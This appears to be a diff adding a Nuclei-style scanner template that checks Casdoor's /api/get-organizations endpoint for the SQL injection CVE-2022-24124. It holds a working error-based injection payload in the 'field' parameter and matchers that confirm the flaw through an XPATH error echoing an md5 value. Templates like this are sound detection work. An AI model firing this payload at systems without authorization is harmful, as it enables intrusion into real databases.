@@ -1,0 +1,28 @@
+id: poc-yaml-casdoor-api-get-oraganizations-sqli
+info:
+  name: Casdoor API get-organizations SQL Injection (CVE-2022-24124)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve2022, sqli
+  description: |
+    Casdoor API endpoint '/api/get-organizations' is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+
+http:
+  - method: GET
+    path:
+      - "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,concat(0x7e,md5({{t1}})),1)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "XPATH syntax error"
+        part: body
+      - type: dsl
+        dsl:
+          - contains(body, substr(md5(t1), 1, 27))
